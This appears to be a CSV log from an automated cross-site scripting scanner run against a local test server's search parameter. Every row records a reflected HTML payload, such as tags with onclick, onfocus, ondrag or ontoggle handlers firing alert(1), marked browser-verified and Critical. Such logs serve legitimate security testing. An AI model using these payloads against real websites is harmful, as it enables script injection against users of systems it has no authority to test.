Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd draggable=""true"" ondragenter=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd draggable=""true"" ondragleave=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 onactivate=alert(1)></dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 onfocus=alert(1)></dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd id=x tabindex=1 onfocusin=alert(1)></dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onbeforecut=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onclick=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd oncontextmenu=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd oncopy=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd oncut=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd ondblclick=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmousedown=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmouseenter=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmouseleave=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmousemove=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmouseout=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmouseover=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onmouseup=""alert(1)"">test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dd onpaste=""alert(1)"" contenteditable>test</dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<deTAiLs/open/oNtoGGle=confirm()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del draggable=""true"" ondragend=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del draggable=""true"" ondragleave=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del draggable=""true"" ondragstart=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 onactivate=alert(1)></del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 onfocus=alert(1)></del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del id=x tabindex=1 onfocusin=alert(1)></del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onbeforecut=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onclick=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del oncontextmenu=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del oncopy=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del oncut=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del ondblclick=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onkeydown=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onkeypress=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onkeyup=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmousedown=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmouseenter=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmouseleave=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmousemove=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmouseout=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmouseover=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onmouseup=""alert(1)"">test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<del onpaste=""alert(1)"" contenteditable>test</del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details draggable=""true"" ondrag=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details draggable=""true"" ondragend=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details draggable=""true"" ondragenter=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details draggable=""true"" ondragleave=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 onactivate=alert(1)></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 onfocus=alert(1)></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details id=x tabindex=1 onfocusin=alert(1)></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onbeforecopy=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onbeforecut=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onbeforepaste=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onclick=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details oncontextmenu=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details oncopy=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details oncut=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details ondblclick=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onkeydown=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onkeypress=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onkeyup=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmousedown=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmouseenter=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmouseleave=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmousemove=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmouseout=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmouseover=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onmouseup=""alert(1)"">test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<details onpaste=""alert(1)"" contenteditable>test</details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<details ontoggle=alert(1) open>test</details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 onactivate=alert(1)></dfn>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onbeforecut=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onbeforepaste=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onclick=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn oncontextmenu=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn oncopy=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn ondblclick=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onkeyup=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmousedown=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmouseenter=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmouseleave=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmousemove=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmouseout=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmouseover=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onmouseup=""alert(1)"">test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dfn onpaste=""alert(1)"" contenteditable>test</dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",RAW_REFLECTION,Yes,alert,Critical
